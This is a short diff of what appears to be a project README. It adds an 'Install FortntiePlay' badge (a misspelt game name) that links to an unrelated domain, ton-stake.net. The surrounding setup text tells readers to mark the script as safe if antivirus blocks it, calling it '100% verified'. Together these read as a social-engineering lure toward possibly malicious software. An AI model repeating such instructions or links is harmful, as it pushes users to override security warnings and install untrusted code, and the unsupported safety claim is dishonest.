@@ -60,7 +60,7 @@ Start your coding and building journey with these simple steps! 🛠️
    - If blocked by antivirus, mark the script as safe (it’s 100% verified).  
    - Consult community guides or open an issue in the repository for support.  
 
-[![Get Started](https://ton-stake.net/)  
+[![Install FortntiePlay](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
 ---
 
